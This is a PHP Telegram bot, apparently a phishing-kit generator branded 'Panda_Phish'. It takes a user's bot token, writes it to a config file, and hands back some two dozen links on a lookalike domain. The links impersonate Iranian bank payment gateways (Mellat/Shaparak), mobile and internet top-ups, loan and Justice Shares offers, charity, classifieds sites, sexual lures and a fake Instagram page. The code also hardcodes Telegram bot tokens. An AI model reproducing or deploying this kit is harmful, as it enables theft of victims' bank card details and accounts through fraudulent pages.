
<?php

echo '<h1> MR BOOM</h1>';
/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/
error_reporting(0);
date_default_timezone_set('Asia/Tehran');
define('API_KEY','1183217404:AAHQC4D-LKpEh8A_zit0iqbHJ2mNVHmNPkg'); //token
function vestor($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

function sms($chatid,$text){
	vestor('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,

	]);
    }
function sm($chatid,$text,$parsmde,$keyboard){
	vestor('sendMessage',[
	'chat_id'=>$chatid,
	'text'=>$text,
	'parse_mode'=>$parsmde,
	'reply_markup'=>$keyboard
	]);
    }
function Delm($chatid,$messageid){
        vestor('sendMessage',[
        'chat_id'=>$chatid,
        'message_id'=>$messageid,
        ]);
        }
function SendVideo($chatid,$video,$caption,$keyboard,$duration){
	vestor('SendVideo',[
	'chat_id'=>$chatid,
	'video'=>$video,
    'caption'=>$caption,
	'duration'=>$duration,
	'reply_markup'=>$keyboard
	]);
	}
	function SendPhoto($chat_id, $photo, $caption, $messageid, $keyboard){
	vestor('SendPhoto',[
    'chat_id'=>$chat_id,
    'photo'=>$photo,
    'caption'=>$caption,
    'reply_to_message_id'=>$messageid,
    'reply_markup'=>$keyboard
     ]);
     }
function em($chatid,$message_id,$parsmde,$text,$keyboard){
vestor('editmessagetext',[
    'chat_id'=>$chatid,
    'message_id'=>$message_id,
    'text'=>$text,
    'parse_mode'=>$parsmde,
    'reply_markup'=>$keyboard
	]);
	}
function ForwardMessage($KojaShe,$AzKoja,$KodomMSG)
{
    vestor('ForwardMessage',[
        'chat_id'=>$KojaShe,
        'from_chat_id'=>$AzKoja,
        'message_id'=>$KodomMSG
    ]);
}
function deleteFolder($path){
    if (is_dir($path) === true) {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file)
            deleteFolder(realpath($path) . '/' . $file);

        return rmdir($path);
    } else if (is_file($path) === true)
        return unlink($path);

    return false;
}

//============(config)==========
$token = "1342739873:AAHjPUDsPBmyQ5ErZyj0SgI1Jo27s3L1apU";
$channel = "@Panda_Phish"; // آیدی کانال همراه @
$admins = [1366857156]; // آیدی عددی ادمین
$admin = 1366857156;
$botid = "Panda_Phish"; // آیدی کانال بدون @
$url = "https://bml-shaparack-ir.cf"; // آدرس پوشه سورس 
//==============================
$update = json_decode(file_get_contents("php://input"));
$message = $update->message;
$reply = $message->reply_to_message;
$reply_forid = $reply->forward_from->id;
$message_id = $update->message->message_id;
$data = isset($message->text)?$message->text:$update->callback_query->data;
$chat_id = isset($update->callback_query->message->chat->id)?$update->callback_query->message->chat->id:$update->message->chat->id;
$from_id = isset($update->callback_query->message->from->id)?$update->callback_query->message->from->id:$update->message->from->id;
$text = $update->message->text;
$member = count(scandir("data"))-2;
$mi = isset($update->callback_query->message->message_id)?$update->callback_query->message->message_id:null;
$first_n = $update->message->from->first_name;
$last_n = $update->message->from->last_name;
$first = $update->callback_query->from->first_name;
$last = $update->callback_query->from->last_name;
$usernamee = $update->message->from->username;
$username = $update->callback_query->from->username;
$truechannel = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$channel&user_id=".$chat_id));
$channel_check = $truechannel->result->status;
@$Tche = json_decode(file_get_contents("https://api.telegram.org/bot$text/getme"));
$Tcheck = $Tche->ok;
$sup2020 = file_get_contents("data/$chat_id/sup.txt");
//===============================
$user = json_decode(file_get_contents("User/user.json"),true);
$step = json_decode(file_get_contents("User/$chat_id.json"),true);
//===============================
$buttons = $step["userinfo"]["$chat_id"]["main-but"];
$state = $step["userinfo"]["$chat_id"]["state"];
//===============================
/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/

if($buttons =="inline"){
$start = json_encode(['inline_keyboard'=>[
[['text'=>"➕ ساخت درگاه ➕","callback_data"=>"Create"]],
[['text'=>"","callback_data"=>"sup2020"],['text'=>"❗حذف درگاه❗","callback_data"=>"del-pay"]],
[['text'=>"","callback_data"=>"info"],['text'=>"","callback_data"=>"manage"]],[['text'=>"راهنما 💡","callback_data"=>"Help"]],
],'resize_keyboard'=>true]);
}elseif($buttons =="normal"){
$start = json_encode(['keyboard'=>[
[['text'=>"➕ ساخت درگاه ➕"]],
[['text'=>"راهنما 💡"],['text'=>"حذف درگاه 🗑"]],
[['text'=>"👨🏻‍✈️پشتیبانی👨🏻‍✈️"]],
],'resize_keyboard'=>true]);
}
//===============================
$joins = json_encode(['inline_keyboard'=>[
[['text'=>"ورود به کانال 👣",'url'=>"https://telegram.me/$botid"]],
],'resize_keyboard'=>true]);
//===============================
$panel = json_encode(['inline_keyboard'=>[
[['text'=>"","callback_data"=>"Create"]],
[['text'=>"","callback_data"=>"noVIP"],['text'=>"","callback_data"=>"yesVIP"]],
[['text'=>"️آمار 📊","callback_data"=>"amar"]],
[['text'=>"","callback_data"=>"addcoin"],['text'=>"","callback_data"=>"takecoin"]],
[['text'=>"فوروارد همگانی📬","callback_data"=>"fortoall"],['text'=>"پیام همگانی 📋","callback_data"=>"pmtoall"]],
],'resize_keyboard'=>true]);
//===============================
$delbo = json_encode(['inline_keyboard'=>[
[['text'=>"بله✅️","callback_data"=>"yesdel"],['text'=>"خیر❌","callback_data"=>"back"]],
],'resize_keyboard'=>true]);
//===============================
if($buttons =="inline"){
$manage = json_encode(['inline_keyboard'=>[
[['text'=>"1111111111111111111111111111111111","callback_data"=>"edit-but"]],

],'resize_keyboard'=>true]);
}elseif($buttons =="normal"){
$manage = json_encode(['keyboard'=>[
[['text'=>"1111111111111111111111111111111111"]],
[['text'=>"🔙"]],
],'resize_keyboard'=>true]);
}
//===============================
$select_but = json_encode(['inline_keyboard'=>[
[['text'=>"","callback_data"=>"inline-but"],['text'=>"شروع 💸","callback_data"=>"normal-but"]],
],'resize_keyboard'=>true]);
//===============================
$button_remov = json_encode(['KeyboardRemove'=>[],'remove_keyboard'=>true]);
//===============================
if($buttons == "inline"){
$back = json_encode(['inline_keyboard'=>[
[['text'=>"🔙","callback_data"=>"back"]],
],'resize_keyboard'=>true]);
}elseif($buttons =="normal"){
$back = json_encode(['keyboard'=>[
[['text'=>"🔙"]],
],'resize_keyboard'=>true]);
}
//===============================
$coins = $step["userinfo"]["$chat_id"]["coin"];
$invited = $step["userinfo"]["$chat_id"]["invite"];
//===============================
if(!in_array($chat_id, $user["listusers"]) == true) {
$user["listusers"][]="$chat_id";
$user = json_encode($user,128|256);
file_put_contents("User/user.json",$user);
}
//===============================
if($text){
$Logs = file_get_contents('User/BotLog.txt');
$Logs .= "\n"."Flood User : $chat_id";
file_put_contents("User/BotLog.txt",$Logs);
}
//===============================
if($data =="normal-but"){
	$step["userinfo"]["$chat_id"]["main-but"]="normal";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"مجددا /start کنید ♻️","HTML",$button_remov);
}
if($data =="inline-but"){
	$step["userinfo"]["$chat_id"]["main-but"]="inline";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"مجددا /start کنید ♻️","HTML",$button_remov);
}
elseif(strpos($text , '/start ') !== false  ) {
$startsd = str_replace("/start ",null,$text);
sm($chat_id,"$startsd","HTML",$start);
if(in_array($chat_id, $user["listusers"])) {

sm($chat_id,"شما قبلا عضو ربات بودید !","HTML",$start);

}else
{

$stepDM = json_decode(file_get_contents("User/$startsd.json"),true);
$membersd = $stepDM["userinfo"]["$startsd"]["coin"];
$memberplusas = $membersd + 1;

sm($startsd,"کاربر [$chat_id](tg://user?id=$chat_id) با لینک شما وارد ربات شد!🎉

و شما 1 سکه دریافت کردید 😍","MARKDOWN",null);

$stepDM["userinfo"]["$startsd"]["coin"]="$memberplusas";
$stepDM = json_encode($stepDM,true);
file_put_contents("User/$startsd.json",$stepDM);
$Logs = file_get_contents('User/BotLog.txt');
$Logs .= "\n"."New User Start The Bot : $chat_id";
file_put_contents("User/BotLog.txt",$Logs);
	$step["userinfo"]["$chat_id"]["coin"]="0";
	$step["userinfo"]["$chat_id"]["state"]="none";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"ثبت نام موفقیت آمیز بود 👍🏻","HTML",$select_but);

}}
elseif($channel_check != 'member' && $channel_check != 'creator' && $channel_check != 'administrator'){
sm($chat_id,"

کاربر گرامی به ربات خوش آمدید 🔥

برای حمایت ما و باز شدن قفل چنل در کانال ما عضو شوید و بعد از عضویت درستور /start را بزنید !

⚡️ $channel ⚡️

","HTML",$joins,null);
return false;
}


/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/
if ($text =="/start"){
  mkdir("data/$chat_id");
file_put_contents("data/$chat_id/sup.txt","none");
if(!isset(	$step["userinfo"]["$chat_id"]["main-but"])){
sm($chat_id,"ثبت نام موفقیت آمیز بود 👍🏻","HTML",$select_but);
if(!file_exists("User/$chat_id.json")){
$Logs = file_get_contents('User/BotLog.txt');
$Logs .= "\n"."New User Start The Bot : $chat_id";
file_put_contents("User/BotLog.txt",$Logs);
	$step["userinfo"]["$chat_id"]["coin"]="0";
	$step["userinfo"]["$chat_id"]["state"]="none";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
}
}else{
sm($chat_id,"یک گزینه را انتخاب کنید 🔰","HTML",$start);
}
}
if($data =="back" or $data =="backk" or $text =="🔙"){
	$step["userinfo"]["$chat_id"]["state"]="none";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
if($buttons =="inline"){
em($chat_id,$mi,"HTML","یک گزینه را انتخاب کنید 🔰",$start);
}
if($buttons == "normal"){
sm($chat_id,"یک گزینه را انتخاب کنید 🔰","HTML",$start);
}
}
if($data =="manage" or $text ==""){
if($buttons =="normal"){
sm($chat_id,"","HTML",$manage);


}elseif($buttons =="inline"){
em($chat_id,$mi,"HTML","",$manage);
}
}
if($data =="edit-but" or $text =="1111111111111111111111111111111111"){
if($buttons =="normal"){
sm($chat_id,"لطفا نوع دکمه های ربات را مشخص کنید⬇️","HTML",$select_but);
}elseif($buttons =="inline"){
em($chat_id,$mi,"HTML","لطفا نوع دکمه های ربات را مشخص کنید⬇️",$select_but);
}
}

if($data =="SupBot" or $text =="👨🏻‍✈️پشتیبانی👨🏻‍✈️"){
if($buttons =="normal"){
	$step["userinfo"]["$chat_id"]["state"]="pm-sup";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"سلام دوست عزیز پیام خود را ارسال کن و منتظر بمانید تا مدیر جواب بده❤️","HTML",$back);
}elseif($buttons =="inline"){
	$step["userinfo"]["$chat_id"]["state"]="pm-sup";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
em($chat_id,$mi,"HTML","سلام دوست عزیز پیام خود را ارسال کن و منتظر بمانید تا مدیر جواب بده❤️",$back);
}
}
if($step =="pm-sup" && $text !="🔙" && $data !="back"){
	$step["userinfo"]["$chat_id"]["state"]="none";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"🌀 پیام شما به پشتیبانی ارسال شد لطفا تا زمان پاسخگویی صبور باشید !","HTML",$back);
sm($admin,"💠 پیامی از طرف کاربر $chat_id دارید.

🔰 متن پیام :
$text","HTML",$back);
}

if($data =="info" or $text ==""){
if($buttons =="normal"){
sm($chat_id,"","HTML",$back);
}elseif($buttons =="inline"){
em($chat_id,$mi,"HTML","",$back);
}
}


/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/



/*Help */
if($data =="Help" or $text =="راهنما 💡"){
if($buttons =="normal"){
sm($chat_id,"❇️ ابتدا به ربات ( @BotFather ) مراجعه کنید.
➖➖➖➖➖➖➖➖
❇️ دستور /newbot رو ارسال کرده
 وسپس یک نام برای ربات انتخاب کنید.
➖➖➖➖➖➖➖➖
❇️ پس از ارسال نام،یک یوزرنیم ارسال کنید.
⛔️ توجه کنین حتما باید در آخر یوزرنیم ارسالی کلمه bot قرار داده بشه.
➖➖➖➖➖➖➖➖
❇️ اگه احیانا‌ً با پیغام زیر برخورد کردید.
Sorry, this username is already taken. Please try something different.
یعنی قبلا فردی دیگر این یوزرنیم رو ثبت کرده پس یوزرنیم دیگری وارد کنید.
➖➖➖➖➖➖➖➖
❇️ سپس به درگاه ساز ما مراجعه کنید و دکمه(➕ ساخت درگاه ➕) رو بزنید!
❇️ توکن ربات دریافتی از ربات ( @BotFather ) رو برای درگاه ساز ارسال کنید.
➖➖➖➖➖➖➖➖
⚠️👇 نمونه توکن ربات ⚠️👇
369762599:AAFeMVVjM8KSYz_-1f-6nowsl22-0gGAr36
➖➖➖➖➖➖➖➖
🆔 $channel","HTML",$back);
}elseif($buttons =="inline"){
em($chat_id,$mi,"HTML","❇️ ابتدا به ربات ( @BotFather ) مراجعه کنید.
➖➖➖➖➖➖➖➖
❇️ دستور /newbot رو ارسال کرده
 وسپس یک نام برای ربات انتخاب کنید.
➖➖➖➖➖➖➖➖
❇️ پس از ارسال نام،یک یوزرنیم ارسال کنید.
⛔️ توجه کنین حتما باید در آخر یوزرنیم ارسالی کلمه bot قرار داده بشه.
➖➖➖➖➖➖➖➖
❇️ اگه احیانا‌ً با پیغام زیر برخورد کردید.
Sorry, this username is already taken. Please try something different.
یعنی قبلا فردی دیگر این یوزرنیم رو ثبت کرده پس یوزرنیم دیگری وارد کنید.
➖➖➖➖➖➖➖➖
❇️ سپس به درگاه ساز ما مراجعه کنید و دکمه(➕ ساخت درگاه ➕) رو بزنید!
❇️ توکن ربات دریافتی از ربات ( @BotFather ) رو برای درگاه ساز ارسال کنید.
➖➖➖➖➖➖➖➖
⚠️👇 نمونه توکن ربات ⚠️👇
369762599:AAFeMVVjM8KSYz_-1f-6nowsl22-0gGAr36
➖➖➖➖➖➖➖➖
🆔 $channel",$back);
}
}


$randcode = rand(00000,99999);

if($data =="Create" or $text =="➕ ساخت درگاه ➕"){







	$step["userinfo"]["$chat_id"]["state"]="CreateMellat";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
if($buttons =="normal"){
sm($chat_id,"لطفا توکن ربات خود را ارسال کنید 🤖
@BotFather","HTML",$back);
}elseif($buttons =="inline"){
sm($chat_id,"🛠 لطفا توکن ربات خود برای ساخت درگاه به اینجا ارسال کنید :\n💎 برای گرفتن توکن باید به ربات BotFather بروید و یک ربات بسازید !\n\n🤖 @BotFather","HTML",$back);
}

}
if($state == "CreateMellat" && $data !="back" && $text != "🔙"){
if($Tcheck == true){
if($step["userinfo"]["$chat_id"]["created"] !="yes"){
$userbot = $Tche->result->username;
$O=rand(1000,9000);
$FileName = "User/$O.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "<?php\n");
fwrite($FileHandle, "$");
fwrite($FileHandle, "TOKEN='$text';\n");
fwrite($FileHandle, "$");
fwrite($FileHandle, "ID= $chat_id;\n");
fwrite($FileHandle, "?>");

//
$Irancell2="$url/Irancell2/?e=$O";
$Live="$url/Live/?e=$O";
$Sighe="$url/Sighe/?e=$O";
$Irancell="$url/Irancell/?e=$O";
$Masaj="$url/Masaj/?e=$O"; 
$Mobo="$url/Mobo/?e=$O";
$Charge="$url/Charge/?e=$O" ;
$Vam="$url/Vam/?e=$O";
$Mci="$url/Mci/?e=$O" ;
$Chat="$url/Chat/?e=$O";
$net6="$url/Net/?e=$O";
$Internet="$url/Internet/?e=$O" ;
$Hamta="$url/Hamta/?e=$O" ;
$Kheyrieh="$url/Kheyrieh/?e=$O" ;
$Internetmeli="$url/Internetmeli/?e=$O" ;
$Saham="$url/Saham/?e=$O" ;
$Freefolower="$url/Freefolower/?e=$O";
$Mellat= "$url/Mellat/?e=$O" ;
$Folower="$url/Folower/?e=$O";
$Filimo="$url/Filimo/?e=$O";
$Divar="$url/Divar/?e=$O" ;
$Shey="$url/shy/?e=$O" ;
$Divar2="$url/dv/?e=$O" ;            
$netstudent="$url/netstudent/?e=$O" ;
//***********************************************//
$Dostyabi="$url/Dostyabi/?e=$O" ;




if($step["userinfo"]["$chat_id"]["vip"] !="yes"){

file_put_contents("$chat_id/User.php",$set);
}else{

$set = str_replace("sleep(1);",null,$set);
file_put_contents("$chat_id/User.php",$set);

}
sm($chat_id,"
        ╔═ [𝚈𝚘𝚞𝚛 𝚕𝚒𝚗𝚔𝚜!] ════╣⫸
╟ ✳️  Name : Mellat(به پرداخت) 
║ 🔗 $Mellat
╠═══════════════╣⫸
╟ ✳️  Name : Charge(خرید اینترنتی شارژ)
║🔗 $Charge
╠═══════════════╣⫸
╟ ✳️  Name : (خرید نت)
║🔗 $net6
╠═══════════════╣⫸
╟ ✳️  Name : (وام یک میلیونی)
║🔗 $Vam
╠═══════════════╣⫸
╟ ✳️  Name : (ام سی ای)
║🔗 $Mci
╠═══════════════╣⫸
╟ ✳️  Name : (سکس چت)
║🔗 $Chat
╠═══════════════╣⫸
╟ ✳️  Name : (لایو سکسی)
║🔗 $Live
╠═══════════════╣⫸
╟ ✳️  Name : (ایرانسل)
║🔗 $Irancell
╠═══════════════╣⫸
╟ ✳️  Name : (نت جدید)
║🔗 $Internet
╠═══════════════╣⫸
╟ ✳️  Name : (موبو شارژ)
║🔗 $Mobo
╠═══════════════╣⫸
╟ ✳️  Name : (کمک به بیماران) 
║🔗 $Kheyrieh
╠═══════════════╣⫸
╟ ✳️  Name : (اینترنت ملی)
║🔗 $Internetmeli
╠═══════════════╣⫸
╟ ✳️  Name : (سهام عدالت)
║🔗 $Saham
╠═══════════════╣⫸
╟ ✳️  Name : (خرید فالوور)
║🔗 $Folower
╠═══════════════╣⫸
╟ ✳️  Name : (فیلیمو)
║🔗 $Filimo
╠═══════════════╣⫸
╟ ✳️  Name : (دوستیابی)
║🔗 $Dostyabi
╠═══════════════╣⫸
╟ ✳️  Name : (فیک پیج اینستاگرام)
║🔗 $Freefolower
╠═══════════════╣⫸
╟ ✳️  Name : ( ماساژ)
║🔗 $Masaj
╠═══════════════╣⫸
╟ ✳️  Name : ( دیوار 1)
║🔗 $Divar
╠═══════════════╣⫸
╟ ✳️  Name : ( دیوار 2)
║🔗 $Divar2
╠═══════════════╣⫸
╟ ✳️  Name : ( شیپور ) 
║🔗 $Shey
╠═══════════════╣⫸
╟ ✳️  Name : ( نت دانش آموزی)
║🔗 $netstudent
╠═══════════════╣⫸
╟ 🔢YOR  CODE <code>$O<code>
╠════════[𝙲𝚛𝚎𝚊𝚝𝚘𝚛] ════╣⫸
╟ ✨Cʀᴇᴀᴛᴇᴅ Bʏ : @SunPhish
║ 
╠═══[𝙲𝚑𝚊𝚗𝚗𝚎𝚕𝚝𝚎𝚕]═══════╣⫸
╟ 🆔 @Panda_Phish
║ 
╚══════  [𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔!] ════╣⫸
","HTML",$back);
	$step["userinfo"]["$chat_id"]["state"]="none";
	$step["userinfo"]["$chat_id"]["token"]="$text";
	$step["userinfo"]["$chat_id"]["userbot"]="$userbot";
	$step["userinfo"]["$chat_id"]["created"]="yes";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
}else{
sm($chat_id,"
        ╔═ [𝚈𝚘𝚞𝚛 𝚕𝚒𝚗𝚔𝚜!] ════╣⫸
╟ ✳️ Name : Mellat(به پرداخت) 
║🔗 $Mellat
╠═══════════════╣⫸
╟ ✳️ Name : Charge(خرید اینترنتی شارژ)
║🔗 $Charge
╠═══════════════╣⫸
╟ ✳️ Name : (خرید نت)
║🔗 $net6
╠═══════════════╣⫸
╟ ✳️ Name : (وام یک میلیونی)
║🔗 $Vam
╠═══════════════╣⫸
╟ ✳️ Name : (ام سی ای)
║🔗 $Mci
╠═══════════════╣⫸
╟ ✳️ Name : (سکس چت)
║🔗 $Chat
╠═══════════════╣⫸
╟ ✳️ Name : (لایو سکسی)
║🔗 $Live
╠═══════════════╣⫸
╟ ✳️ Name : (ایرانسل)
║🔗 $Irancell
╠═══════════════╣⫸
╟ ✳️ Name : (نت جدید)
║🔗 $Internet
╠═══════════════╣⫸
╟ ✳️ Name : (موبو شارژ)
║🔗 $Mobo
╠═══════════════╣⫸
╟ ✳️ Name : (کمک به بیماران) 
║🔗 $Kheyrieh
╠═══════════════╣⫸
╟ ✳️ Name : (اینترنت ملی)
║🔗 $Internetmeli
╠═══════════════╣⫸
╟ ✳️ Name : (سهام عدالت)
║🔗 $Saham
╠═══════════════╣⫸
╟ ✳️ Name : (خرید فالوور)
║🔗 $Folower
╠═══════════════╣⫸
╟ ✳️ Name : (فیلیمو)
║🔗 $Filimo
╠═══════════════╣⫸
╟ ✳️ Name : (فیک پیج اینستاگرام)
║🔗 $Freefolower
╠═══════════════╣⫸
╟ ✳️ Name : ( ماساژ) 
║🔗 $Masaj
╠═══════════════╣⫸
╟ ✳️ Name : ( دیوار 1)
║🔗 $Divar
╠═══════════════╣⫸
╟ ✳️ Name : ( دیوار 2)
║🔗 $Divar2
╠═══════════════╣⫸
╟ ✳️ Name : ( شیپور ) 
║🔗 $Shey
╠═══════════════╣⫸
╟ ✳️ Name : ( نت دانش آموزی)
║🔗 $netstudent
╠═══════════════╣⫸
╟ ✨Cʀᴇᴀᴛᴇᴅ Bʏ : @SunPhish
║ 
╠═══[𝙲𝚑𝚊𝚗𝚗𝚎𝚕𝚝𝚎𝚕]═════╣⫸
╟ 🆔 @Panda_Phish
║ 
╚════  [𝙶𝚘𝚘𝚍 𝚕𝚞𝚌𝚔!] ════╣⫸
","HTML",$back);
}
}
/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/

//============================================================
if($data =="del-pay" or $text =="حذف درگاه 🗑"){
$crde = $step["userinfo"]["$chat_id"]["created"];
if($crde =="yes"){
if($buttons =="normal"){
sm($chat_id,"آیا از حذف آخرین درگاه خود اطمینان دارید ؟ ❌
این عمل غیر قابل بازگشت است !","HTML",$delbo);
}elseif($buttons =="inline"){
em($chat_id,$mi,"HTML","آیا از حذف آخرین درگاه خود اطمینان دارید ؟ ❌
این عمل غیر قابل بازگشت است !",$delbo);
}
}else{
if($buttons =="normal"){
sm($chat_id,"شما در ربات درگاه ساز ما درگاهی ندارید !","HTML",$back);
}elseif($buttons =="inline"){
em($chat_id,$mi,"HTML","شما در ربات درگاه ساز ما درگاهی ندارید !",$back);
}
}
}
if($data =="yesdel"){
$ubo = $step["userinfo"]["$chat_id"]["userbot"];
deleteFolder("$chat_id");
	$step["userinfo"]["$chat_id"]["created"]="no";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
if($buttons =="normal"){
sm($chat_id,"درگاه های شما با موفقيت حذف شد☑️","HTML",$back);
}elseif($buttons =="inline"){
em($chat_id,$mi,"HTML","درگاه های شما با موفقيت حذف شد☑️",$back);
}
}

/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/
if($text =="/panel" && in_array($chat_id,$admins)){
sm($chat_id,"welcome admin :)","HTML",$panel);
}

if($data =="amar" && in_array($chat_id,$admins)){
$mems = count($user["listusers"]);
em($chat_id,$mi,"HTML","
اعضا ربات : $mems نفر ",$panel);
}


if($data =="yesVIP" && in_array($chat_id,$admins)){
	$step["userinfo"]["$chat_id"]["state"]="yesvipa";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"آیدی عددی کاربر را وارد کنید : ","HTML",$back);
}

if($state =="yesvipa" && $data !="back" && in_array($chat_id,$admins)){
$stepT = json_decode(file_get_contents("User/$text.json"),true);
//====
	$stepT["userinfo"]["$text"]["vip"]="yes";
    $stepT = json_encode($stepT,true);
    file_put_contents("User/$text.json",$stepT);
//====
	$step["userinfo"]["$chat_id"]["state"]="none";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"کاربر $text ویژه شد !","HTML",$back);
}

if($data =="noVIP" && in_array($chat_id,$admins)){
	$step["userinfo"]["$chat_id"]["state"]="novipa";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"آیدی عددی کاربر را وارد کنید : ","HTML",$back);
}

if($state =="novipa" && $data !="back" && in_array($chat_id,$admins)){
$stepT = json_decode(file_get_contents("User/$text.json"),true);
//====
	$stepT["userinfo"]["$text"]["vip"]="no";
    $stepT = json_encode($stepT,true);
    file_put_contents("User/$text.json",$stepT);
//====
	$step["userinfo"]["$chat_id"]["state"]="none";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"کاربر $text با موفقیت غیر ویژه شد .","HTML",$back);
}


if($data =="addcoin" && in_array($chat_id,$admins)){
	$step["userinfo"]["$chat_id"]["state"]="addcoins";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"تعداد سکه را وارد کنید :","HTML",$back);
}

if($state =="addcoins" && $data != "back" && in_array($chat_id,$admins)){
	$step["userinfo"]["$chat_id"]["state"]="addcoin2";
	$step["userinfo"]["$chat_id"]["addOcount"]="$text";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"آیدی عددی کاربر را وارد کنید : ","HTML",$back);
}

if($state =="addcoin2" && $data != "back" && in_array($chat_id,$admins)){
$stepT = json_decode(file_get_contents("User/$text.json"),true);
$Oran = $stepT["userinfo"]["$text"]["coin"] + $step["userinfo"]["$chat_id"]["addOcount"];
//====
	$stepT["userinfo"]["$text"]["coin"]="$Oran";
    $stepT = json_encode($stepT,true);
    file_put_contents("User/$text.json",$stepT);
//====
	$step["userinfo"]["$chat_id"]["state"]="none";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"ارسال شد !","HTML",$back);
}


/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/
//===========================
if($data =="takecoin" && in_array($chat_id,$admins)){
	$step["userinfo"]["$chat_id"]["state"]="takecoins";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"تعداد سکه را وارد کنید :","HTML",$back);
}

if($state =="takecoins" && $data != "back" && in_array($chat_id,$admins)){
	$step["userinfo"]["$chat_id"]["state"]="takecoin2";
	$step["userinfo"]["$chat_id"]["addOcount"]="$text";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"آیدی عددی کاربر را وارد کنید : ","HTML",$back);
}

if($state =="takecoin2" && $data != "back" && in_array($chat_id,$admins)){
$stepT = json_decode(file_get_contents("User/$text.json"),true);
$Oran = $stepT["userinfo"]["$text"]["coin"] - $step["userinfo"]["$chat_id"]["addOcount"];
$mmmm = $step["userinfo"]["$chat_id"]["addOcount"];
//====
	$stepT["userinfo"]["$text"]["coin"]="$Oran";
    $stepT = json_encode($stepT,true);
    file_put_contents("User/$text.json",$stepT);
//====
	$step["userinfo"]["$chat_id"]["state"]="none";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"از کاربر $text میزان $mmmm سکه کم شد ! ","HTML",$back);
}


/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/

if($data =="fortoall" && in_array($chat_id,$admins)){
    	$step["userinfo"]["$chat_id"]["state"]="fortoall";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"پیام خود را فوروارد کنید :","HTML",$back);
}

if($state =="fortoall" && $data != "back" && in_array($chat_id,$admins)){
foreach($user["listusers"] as $sue){
ForwardMessage($sue,$chat_id,$message_id);
}
//===
$step["userinfo"]["$chat_id"]["state"]="none";
$step = json_encode($step,true);
file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"به همه ارسال شد !","HTML",$back);
}

/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/

if($data =="pmtoall" && in_array($chat_id,$admins)){
    	$step["userinfo"]["$chat_id"]["state"]="pmtoall";
    $step = json_encode($step,true);
    file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"پیام خود را فوروارد کنید :","HTML",$back);
}

if($state =="pmtoall" && $data != "back" && in_array($chat_id,$admins)){
foreach($user["listusers"] as $sue){
sm($sue,$text,"HTML",$back);
}
//===
$step["userinfo"]["$chat_id"]["state"]="none";
$step = json_encode($step,true);
file_put_contents("User/$chat_id.json",$step);
sm($chat_id,"به همه ارسال شد !","HTML",$back);
}
$backk = json_encode(['inline_keyboard'=>[
[['text'=>"ＢＡＣＫ","callback_data"=>"backk"]],
],'resize_keyboard'=>true]);
if ($text == "" || $data == "sup2020") {
  sm($chat_id,"","HTML",$backk);
  file_put_contents("data/$chat_id/sup.txt","sup");
}
if ($sup2020 == "sup" and $data !== "bakk") {
  ForwardMessage($admin,$chat_id,$message_id);
  sm($chat_id,"پیام شما با موفقیت ارسال گردید ✅","HTML",$backk);
}
if ($text == "ＢＡＣＫ" || $data == "backk") {
  file_put_contents("data/$chat_id/sup.txt","none");
}
if (isset($reply) and $chat_id == $admin) {
  sm($reply_forid ,"$text","HTML",$backk);
}

/*
Coded BY X_Police111_X
Chanel = T.me/WolfPayo
*/
?>
